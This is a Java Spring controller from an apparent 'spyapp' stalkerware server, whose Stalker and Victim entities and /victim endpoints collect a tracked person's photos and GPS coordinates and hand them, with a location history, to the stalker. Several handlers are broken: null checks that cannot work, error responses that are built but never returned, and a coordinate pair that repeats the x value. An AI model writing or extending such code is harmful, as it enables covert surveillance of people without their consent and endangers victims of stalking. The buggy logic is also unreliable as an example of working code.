/*
 * Copyright (c) 2018. AK
 */

package com.spyapp.server.core.beans.controlers;

import com.spyapp.server.core.beans.entities.Cordinates;
import com.spyapp.server.core.beans.entities.Photo;
import com.spyapp.server.core.beans.entities.Stalker;
import com.spyapp.server.core.beans.entities.Victim;
import com.spyapp.server.core.beans.repositories.PhotoRepository;
import com.spyapp.server.core.beans.repositories.StalkerRepository;
import com.spyapp.server.core.beans.repositories.VictimRepository;
import com.spyapp.server.core.beans.services.StalkingService;
import com.spyapp.server.requestresponsemodel.request.AddPhotoRequest;
import com.spyapp.server.requestresponsemodel.request.PhotosRequest;
import com.spyapp.server.requestresponsemodel.request.UpdateCordinatesRequest;
import com.spyapp.server.requestresponsemodel.response.victimresponse.PhotoAddedResponse;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.Date;
import java.util.LinkedList;

@Controller
@RequestMapping("/victim")
public class VictimController {

    @Autowired
    private VictimRepository victimRepository;

    @Autowired
    private StalkerRepository stalkerRepository;

    @Autowired
    private PhotoRepository photoRepository;

    @Autowired
    private StalkingService stalkingService;

    /**
     * Allows to get photos of Stalker and Victim
     *
     * @param photosRequest JSON of PhotosRequest (Stalker name and Victim name)
     * @return
     */
    @PostMapping(value = "getPhotos")
    public ResponseEntity<LinkedList<Photo>> getAllPhotos(@RequestBody PhotosRequest photosRequest) {

        Stalker stalker = stalkerRepository.findByUsername(photosRequest.getStalkerName()).get();

        Victim victim = victimRepository.findVictimByStalkerAndName(stalker, photosRequest.getVictimName()).get();

        LinkedList<Photo> photoLinkedList = photoRepository.findByVictim(victim);

        return new ResponseEntity<LinkedList<Photo>>(photoLinkedList, HttpStatus.ACCEPTED);
    }

    /**
     * Allows to add photo
     *
     * @param request
     * @return
     */
    @PostMapping(value = "addPhoto")
    public ResponseEntity<PhotoAddedResponse> addPhoto(@RequestBody AddPhotoRequest request) {

        Stalker stalker = stalkerRepository.findByUsername(request.getStalkerName()).orElseGet(null);

        Victim victim = victimRepository.findVictimByStalkerAndName(stalker, request.getVictimName()).orElseGet(null);

        if (stalker == null || victim == null) {
            new ResponseEntity<PhotoAddedResponse>(new PhotoAddedResponse("Stalker or Victim not found", HttpStatus.ACCEPTED, new Date()), HttpStatus.NOT_ACCEPTABLE);
        }

        Photo photo = new Photo(request.getLink(), victim);

        photoRepository.save(photo);

        return new ResponseEntity<PhotoAddedResponse>(new PhotoAddedResponse("Photo added", HttpStatus.ACCEPTED, new Date()), HttpStatus.ACCEPTED);
    }

    /**
     * Gets photos of stalker - victim pair
     *
     * @param stalkerName
     * @param victimName
     * @return
     */
    @GetMapping(value = "getPhotos/{stalkerName}/{victimName}")
    public ResponseEntity<LinkedList<Photo>> getPhotos(@PathVariable String stalkerName, @PathVariable String victimName) {

        Stalker stalker = stalkerRepository.findByUsername(stalkerName).orElseGet(null);

        Victim victim = victimRepository.findVictimByStalkerAndName(stalker, victimName).orElseGet(null);

        if (stalker == null || victim == null) {
            new ResponseEntity<LinkedList<Photo>>(new LinkedList<Photo>(), HttpStatus.NOT_ACCEPTABLE);
        }


        return new ResponseEntity<LinkedList<Photo>>(photoRepository.findByVictim(victim), HttpStatus.ACCEPTED);
    }

    /**
     * Gets cordinates of stalker - victim pair
     *
     * @param stalkerName
     * @param victimName
     * @return
     */
    @GetMapping(value = "getCordinates/{stalkerName}/{victimName}")
    public ResponseEntity<Cordinates> getCords(@PathVariable String stalkerName, @PathVariable String victimName) {
        Stalker stalker = stalkerRepository.findByUsername(stalkerName).orElseGet(null);

        Victim victim = victimRepository.findVictimByStalkerAndName(stalker, victimName).orElseGet(null);

        if (stalker == null || victim == null) {
            new ResponseEntity<Cordinates>(new Cordinates("n/d", "n/d"), HttpStatus.NOT_ACCEPTABLE);
        }

        return new ResponseEntity<Cordinates>(new Cordinates(victim.getCordinatesx().toString(), victim.getCordinatesy().toString()), HttpStatus.ACCEPTED);
    }

    /**
     * Allows to update cordinates of stalker - victim pair
     *
     * @param updateCordinatesRequest
     * @return
     */
    @PostMapping(value = "updateCordinates")
    public ResponseEntity<Cordinates> updateCordinates(@RequestBody UpdateCordinatesRequest updateCordinatesRequest) {


        Stalker stalker = stalkerRepository.findByUsername(updateCordinatesRequest.getStalkerName()).orElseGet(null);

        Victim victim = victimRepository.findVictimByStalkerAndName(stalker, updateCordinatesRequest.getVictimName()).orElseGet(null);

        if (stalker == null || victim == null) {
            new ResponseEntity<Cordinates>(new Cordinates("n/d", "n/d"), HttpStatus.NOT_ACCEPTABLE);
        }

        if (victim != null) {
            victim.setCordinatesx(Double.parseDouble(updateCordinatesRequest.getCordinatesx()));
            victim.setCordinatesy(Double.parseDouble(updateCordinatesRequest.getCordinatesy()));

            Cordinates cordinates = new Cordinates(updateCordinatesRequest.getCordinatesx(), updateCordinatesRequest.getCordinatesx());
            System.out.println(cordinates);
            stalkingService.addCordinatesToMap(victim.getName(), cordinates);
            victimRepository.save(victim);
            return new ResponseEntity<Cordinates>(new Cordinates(updateCordinatesRequest.getCordinatesx(),
                    updateCordinatesRequest.getCordinatesy()),
                    HttpStatus.ACCEPTED);
        } else {
            return new ResponseEntity<Cordinates>(new Cordinates("n/d", "n/d"), HttpStatus.NOT_ACCEPTABLE);
        }
    }

    /**
     * Allows to get list of all coordinates of victim
     *
     * @param stalkerName
     * @param victimName
     * @return
     */
    @GetMapping(value = "getAllCordinates/{stalkerName}/{victimName}")
    public ResponseEntity<LinkedList<Cordinates>> getAllCords(@PathVariable String stalkerName, @PathVariable String victimName) {

        Stalker stalker = stalkerRepository.findByUsername(stalkerName).orElseGet(null);

        Victim victim = victimRepository.findVictimByStalkerAndName(stalker, victimName).orElseGet(null);

        if (stalker == null || victim == null) {
            System.out.println("Stalker or Victim name");
            new ResponseEntity<LinkedList<Cordinates>>(new LinkedList<Cordinates>(), HttpStatus.NOT_ACCEPTABLE);
        }

        return new ResponseEntity<LinkedList<Cordinates>>(stalkingService.getCordinatesOfVictim(victim.getName()), HttpStatus.ACCEPTED);
    }
}
